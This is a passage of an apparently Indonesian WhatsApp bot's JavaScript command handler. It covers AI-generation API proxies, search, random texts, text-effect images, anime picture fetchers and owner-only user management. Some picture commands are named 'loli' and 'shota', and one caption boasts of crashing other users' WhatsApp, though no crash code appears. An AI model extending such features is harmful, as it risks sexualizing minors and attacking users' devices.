let anu = await diff(text)
let hasil = await processing(anu, "enhance");
ryozingod.sendFile(m.chat, hasil, 'anu.jpg', `Prompt: ${text}`, m)
}
break
case "prompt-gpt": {
inireact()
if (!text) return xgreply (`Example : ${m.prefix + m.command} buatkan lirik lagu tentang persahabatan dengan genre pop dan panjang 8 baris|# Lirik Lagu,# Genre: Pop,# Panjang: 8 baris,# Tema: Persahabatan
`)
iniprompt = q.split("|")[0]
initeks = q.split("|")[1]
var js = await fetch(`https://aemt.me/prompt/gpt?prompt=${iniprompt}&text=${initeks}`) 
var json = await js.json()
xgreply(json.result)
}
break
case "gptgo": {
inireact()
if (!text) return xgreply (`Example : ${m.prefix + m.command} Apa itu gpt go?`)
var js = await fetch(`https://aemt.me/gptgo?text=${q}`) 
var json = await js.json()
xgreply(`Berikut Adalah Hasil Dari Gpt-Go \n\n\n\n\n ${json.result}`)
}
break
case "dall-e": {
inireact()
if (!q) return xgreply (`Example : ${m.prefix + m.command} Gunung Dengan Cuaca Hujan`)
imgurl = `https://aemt.me/dalle?text=${q}`
       ryozingod.sendMessage(m.chat, {
            image: {url: imgurl},
            caption: 'Nih,Btw klo ngasih ilustrasi yang bener ya'
        },{quoted: m })
    }
break
case "stablediffusion": {
inireact()
if (!q) return xgreply (`Example : ${m.prefix + m.command} Gunung Dengan Cuaca Hujan`)
imgurl = `https://aemt.me/stablediffusion?text=${q}`
       ryozingod.sendMessage(m.chat, {
            image: {url: imgurl},
caption: 'Nih,Btw klo ngasih ilustrasi yang bener ya'
        },{quoted: m })
    }  
break
case "c-ai": {
inireact()
if (!q) return xgreply (`Example : ${m.prefix + m.command} buatkan lirik lagu tentang persahabatan dengan genre pop dan panjang 8 baris|# Lirik Lagu,# Genre: Pop,# Panjang: 8 baris,# Tema: Persahabatan
`)
iniprompt = q.split("|")[0]
initeks = q.split("|")[1]
var js = await fetch(`https://aemt.me/ai/c-ai?prompt=${iniprompt}&text=${initeks}`) 
var json = await js.json()
xgreply(json.result)
}
break

// Search
case 'google-search':
inireact()
if (!q) return xgreply (`Example : ${m.prefix + m.command} santet`)
var js = 'https://dikaardnt.com/api/search/google?q=' + encodeURIComponent(q)
fetch(js).then(response => response.json()).then(json => {
if (json && json.result && json.result.length > 0) {
var capt = `❗ Note : Bot Akan Memberikan Hasil Acak. JIka Hasil Tidak Sesuai Dengan Yang Diinginkan, Silahkan Ketik Ulang .${command} ${q}
🔎 Search : ${q}
💼 Title : ${json.result[0].title}
🔗 Link : ${json.result[0].originalUrl}`
ryozingod.sendMessage(m.chat, { image: { url: json.result[0].url }, caption: capt }, { quoted: m })
} else {
var capt = `❗ Note : Bot Akan Memberikan Hasil Acak. JIka Hasil Tidak Sesuai Dengan Yang Diinginkan, Silahkan Ketik Ulang .${command} ${q}
🔎 Search : ${q}
Maaf, tidak ada hasil yang ditemukan.`
ryozingod.sendMessage(m.chat, capt, { quoted: m })
}
})
break

case 'google-article': {
inireact()
if (!q) return xgreply (`Example : ${m.prefix + m.command} penis`)
var js = await fetch(`https://dikaardnt.com/api/search/google/article?q=${q}`)
var json = await js.json()
xgreply(`
❗ Note : Bot Akan Memberikan Hasil Acak. JIka Hasil Tidak Sesuai Dengan Yang Diinginkan, Silahkan Ketik Ulang .${command} ${q}

💼 Title : ${json[0].title}
🔗 Link : ${json[0].link}
📝 Description : ${json[0].description}
`)
}
break

case 'search-kbbi': {
inireact();
if (!q) return xgreply(`Example: ${m.prefix + m.command} persuasif`);
var response = await fetch(`https://dikaardnt.com/api/search/kbbi?q=${q}`);
var data = await response.text();
xgreply(`📝 Result : ${data}`)
}
break

case 'search-apk': {
inireact()
if (!q) return xgreply (`Example : ${m.prefix + m.command} whatsapp`)
var js = await fetch(`https://dikaardnt.com/api/search/apk?q=${q}`)
var json = await js.json()
var capt = `
❗ Note : Bot Akan Memberikan Hasil Acak. JIka Hasil Tidak Sesuai Dengan Yang Diinginkan, Silahkan Ketik Ulang .${command} ${q}
    
💼 Title : ${json[0].package}
🔗 Link : ${json[0].url}
👤 Develoepr : ${json[0].developer}
⭐ Rating : ${json[0].rating}
`;
await ryozingod.sendMessage(m.chat, { image: { url: json[0].thumbnail }, caption: capt }, { quoted: m })
}
break

case 'search-sticker': {
inireact()
if (!q) return xgreply (`Example : ${m.prefix + m.command} kururmi`)
var js = await fetch(`https://dikaardnt.com/api/search/sticker?q=${q}`)
var json = await js.json()
xgreplyk(`
❗ Note : Bot Akan Memberikan Hasil Acak. JIka Hasil Tidak Sesuai Dengan Yang Diinginkan, Silahkan Ketik Ulang .${command} ${q}

💼 Title : ${json[0].title}
🔗 Link : ${json[0].url}
⭐ Total : ${json[0].total}
`);
}
break

case 'search-resep': {
inireact();
if (!q) return xgreply(`Contoh: ${m.prefix + m.command} sambal`);
var response = await fetch(`https://aemt.me/cariresep?query=${q}`);
var data = await response.json();
var result = data.hasil.data.map(item => `${item.judul}: ${item.link}`).join('\n');
xgreply(`🔍 Query: ${q}
📝 Hasil Pencarian:
${result}`);
}
break
    
//Random Ngata 
case "ngatabacot": {
inireact()
    var js = await fetch(`https://api.akuari.my.id/randomtext/bacot`, { timeout: 1500 });
    var json = await js.json();
    xgreply(`🌤️ *${json.hasil.result}*`);
}
break
case "tokohindo": {
    inireact();
    var apiEndpoint = "https://api.akuari.my.id/randomtext/tokohindo";
    var response = await fetch(apiEndpoint, { timeout: 1500 });
    var json = await response.json();
    xgreply(
        `❗🇮🇩 _*Informasi Pahlawan*_❗🇮🇩\n\n🥲Sorry. Mimin Gabisa Kasih Gambar Pahlawan nya, Soalnya eror mulu. Jadi Mimin Hanya Kasih Link Gambar Nya Doang. Mohon Dimaklumi.\n\n ` +
        `*Nama*: ${json.hasil.nama}\n` +
        `*Kategori*: ${json.hasil.kategori}\n` +
        `*Asal*: ${json.hasil.asal}\n` +
        `*Lahir*: ${json.hasil.lahir}\n` +
        `*Usia*: ${json.hasil.usia}\n` +
        `*Gugur*: ${json.hasil.gugur}\n` +
        `*Lokasi Makam*: ${json.hasil.lokasimakam}\n` +
        `*Sejarah*: ${json.hasil.history}\n` +
        `![Gambar](${json.hasil.img})`
    );
}
break
case "ilhamberkata": {
inireact()
    var js = await fetch(`https://api.akuari.my.id/randomtext/katailham`, { timeout: 1500 });
    var json = await js.json();
    xgreply(
`🌤️ *${json.hasil.result}*

_*-Ilham (Kebanggaan Bang Windah)*_
`);
}
break
case "ngatabuaya": {
inireact()
    var js = await fetch(`https://api.akuari.my.id/randomtext/pantunpakboy`, { timeout: 3000 });
    var json = await js.json();
    xgreply(`🌤️ *${json.hasil.result}*`);
}
break
case "ngatanyindir": {
inireact()
    var js = await fetch(`https://api.akuari.my.id/randomtext/sindiran`, { timeout: 1000 });
    var json = await js.json();
    xgreply(`🌤️ *${json.hasil.result}*`);
}
break
case "quotesanime": {
    inireact();
        var response = await fetch(`https://api.akuari.my.id/randomtext/quotesanime`, { timeout: 1500 });
        var json = await response.json();
        ryozingod.sendMessage(m.chat, {
            image: { url: json.result.img },
            caption: `🌟 *${json.result.char_name}* dari *${json.result.anime}* 🌟\n\n"${json.result.quotes}"\n\n🎬 Episode ${json.result.episode}\n📅 Tanggal: ${json.result.date}`,
        }, { quoted: m });
}
break
case "ngatababaji": {
inireact()
    var js = await fetch(`https://api.akuari.my.id/randomtext/quotespubg`, { timeout: 1500 });
    var json = await js.json();
    xgreply(`🌤️ *${json.hasil}*`);
}
break
case "ngatabucin": {
inireact()
    var js = await fetch(`https://api.akuari.my.id/randomtext/bucin`, { timeout: 1500 });
    var json = await js.json();
    xgreply(`🌤️ *${json.hasil}*`);
}
break
case "dare": {
inireact()
    var js = await fetch(`https://api.akuari.my.id/randomtext/dare`, { timeout: 1500 });
    var json = await js.json();
    xgreply(`🌤️ *${json.hasil}*`);
}
break
case "truth": {
inireact()
    var js = await fetch(`https://api.akuari.my.id/randomtext/dare`, { timeout: 1500 });
    var json = await js.json();
    xgreply(`🌤️ *${json.hasil}*`);
}
break
case "pantun": {
inireact()
    var js = await fetch(`https://api.akuari.my.id/randomtext/pantun`, { timeout: 1500 });
    var json = await js.json();
    xgreply(`🌤️ ${json.hasil}`);
}
break

    //Owner fitur
case 'addprem': {
inireact()
if (!isDeveloper) return xgreply(mess.owner)
if (args.length < 2)
return xgreply(`Penggunaan :\n*#addprem* @tag waktu\n*#addprem* nomor waktu\n\nContoh : #addprem @tag 30d`);
if (m.mentionedJid.length !== 0) {
for (let i = 0; i < m.mentionedJid.length; i++) {
addPremiumUser(m.mentionedJid[0], args[1], orgkaya);
}
xgreply("Sukses Premium")
} else {
addPremiumUser(args[0] + "@s.whatsapp.net", args[1], orgkaya);
xgreply("Sukses Via Nomer")
}
}
break

case 'delprem': {
inireact()
if (!isDeveloper) return xgreply(mess.owner)
if (args.length < 1) return xgreply(`Penggunaan :\n*#delprem* @tag\n*#delprem* nomor`);
// Baca isi file premium.json dan konversi ke dalam objek JavaScript
  if (m.mentionedJid.length !== 0) {
    for (let i = 0; i < m.mentionedJid.length; i++) {
      // Logika untuk menghapus entitas premium berdasarkan pengguna yang disebutkan
      let mentionedPremiumIndex = orgkaya.findIndex(premium => premium.id === m.mentionedJid[i]);
      if (mentionedPremiumIndex !== -1) {
        orgkaya.splice(mentionedPremiumIndex, 1);
      }
    }
    // Setelah melakukan perubahan, tulis kembali ke file
    fs.writeFileSync("./dtbs/premium.json", JSON.stringify(orgkaya));
    xgreply("Sukses Delete");
  } else {
    // Logika untuk menghapus entitas premium berdasarkan nomor yang diberikan
    let targetNumber = args[0] + "@s.whatsapp.net";
    let targetPremiumIndex = orgkaya.findIndex(premium => premium.id === targetNumber);
    if (targetPremiumIndex !== -1) {
      orgkaya.splice(targetPremiumIndex, 1);
      // Setelah melakukan perubahan, tulis kembali ke file
      fs.writeFileSync("./dtbs/premium.json", JSON.stringify(orgkaya));
      xgreply("Sukses Via Nomer");
    } else {
      xgreply("Entitas premium tidak ditemukan");
    }
  }
}
break

case 'addowner': {
inireact()
if (!isDeveloper) return xgreply(mess.owner)
if (!args[0]) return xgreply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} ${ownNumb}`)
prem1 = text.split("|")[0].replace(/[^0-9]/g, '')
let cek1 = await ryozingod.onWhatsApp(prem1 + `@s.whatsapp.net`)
if (cek1.length == 0) return (`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
kontributor.push(prem1)
fs.writeFileSync('./dtbs/owner.json', JSON.stringify(kontributor))
xgreply(`${prem1} Sudah menjadi kontributor!!!`)
ryozingod.sendMessage(prem1+'@s.whatsapp.net', {image: {url: `https://telegra.ph/file/4591e4839848523095e05.jpg`}, caption: `Kamu sekarang adalah owner / kontributor bot`},{quoted: qpay})
}
break

case 'delowner': {
inireact()
if (!isDeveloper) return xgreply(mess.owner)
ryozingod.sendMessage(m.chat, { react: { text: `${randomemoji}`, key: m.key }})
if (!args[0]) return xgreply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} ${ownNumb}`)
prem2 = text.split("|")[0].replace(/[^0-9]/g, '')
unp = kontributor.indexOf(prem2)
kontributor.splice(unp, 1)
fs.writeFileSync('./dtbs/owner.json', JSON.stringify(kontributor))
xgreply(`${prem2} Tidak lagi Kontributor!!!`)
}
break

case 'addseller':
  inireact()
  if (!isDeveloper) return
  if (!args[0]) return xgreply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} ${ownNumb}`)
  var prem1 = text.split("|")[0].replace(/[^0-9]/g, '')
  orgkaya.push(prem1)
  fs.writeFileSync('./dtbs/seller.json', JSON.stringify(orgkaya))
  xgreply(`${prem1} Sudah menjadi orgkaya!!!`)
  await sleep(3500)
  ryozingod.sendMessage(prem1 + '@s.whatsapp.net', {
    image: { url: 'https://telegra.ph/file/4591e4839848523095e05.jpg' },
    caption: 'Kamu sekarang adalah Reseller!!'
  }, { quoted: m })
break

case 'delseller':
inireact()
if (!isDeveloper) return 
if (!args[0]) return xgreply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} ${ownNumb}`)
prem2 = text.split("|")[0].replace(/[^0-9]/g, '')
unp = orgkaya.indexOf(prem2)
orgkaya.splice(unp, 1)
fs.writeFileSync('./dtbs/seller.json', JSON.stringify(orgkaya))
xgreply(`${prem2} Tidak lagi Reseller!!!`)
break

//Scrapper
inireact()
case "kill":case "pat":case "lick":case "bite":case "yeet":case "bonk":case "wink":case "poke":case "nom":case "slap":case "smile":case "wave":case "blush":case "smug":case "glomp":case "happy":case "dance":case "cringe":case "highfive":case "handhold": {
inireact()
xgreply(mess.wait)
let bugil = `🍻Succes Beb ÙnÚ`
axios.get(`https://api.waifu.pics/sfw/waifu`)
.then(({data}) => {
ryozingod.sendMessage(m.chat, {
  image: {url: data.url },
  caption: 'Generated by Spider 🕷️'
    },{quoted: m })
})
}
break
case 'neko':
case 'waifu':
case 'shinobu':
case 'megumin':{
inireact()
xgreply(mess.wait)
axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
ryozingod.sendMessage(m.chat, { image: {url: data.url }, caption: '🐦istri Kartun Melawan Orang Sange Dengan Cara Membuat WhatsApp Orang Sange Tersebut Crash💟' },{quoted: m })
})
}
break

case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{
inireact()
if (!q) return xgreply(`Example : ${prefix+command} ryozingod`) 
xgreply(mess.wait)
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
ryozingod.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break
case 'shadow': 
case 'write': 
case 'romantic': 
case 'burnpaper':
case 'smoke': 
case 'narutobanner': 
case 'love': 
case 'undergrass':
case 'doublelove': 
case 'coffecup':
case 'underwaterocean':
case 'smokyneon':
case 'starstext':
case 'rainboweffect':
case 'balloontext':
case 'metalliceffect':
case 'embroiderytext':
case 'flamingtext':
case 'stonetext':
case 'writeart':
case 'summertext':
case 'wolfmetaltext':
case 'nature3dtext':
case 'rosestext':
case 'naturetypography':
case 'quotesunder':
case 'shinetext':{
inireact()
xgreply(mess.wait)
if (!q) return xgreply(`Example : ${prefix+command} ryozingod`) 
let link
if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
if (/writeart/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html'
if (/summertext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html'
if (/wolfmetaltext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html'
if (/nature3dtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html'
if (/rosestext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html'
if (/naturetypography/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html'
if (/quotesunder/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html'
if (/shinetext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html'
if (/shadow/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html'
if (/write/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html'
if (/romantic/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html'
if (/burnpaper/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html'
if (/smoke/.test(command)) link = 'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html'
if (/narutobanner/.test(command)) link = 'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html'
if (/love/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html'
if (/undergrass/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html'
if (/doublelove/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html'
if (/coffecup/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html'
if (/underwaterocean/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html'
if (/smokyneon/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html'
if (/starstext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html'
if (/rainboweffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html'
if (/balloontext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html'
if (/metalliceffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html'
if (/embroiderytext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html'
if (/flamingtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
let dehe = await photooxy.photoOxy(link, q)
ryozingod.sendMessage(m.chat, { image: { url: dehe }, caption: `${mess.success}` }, { quoted: m })
}
break

case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
inireact()
xgreply(mess.wait)
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
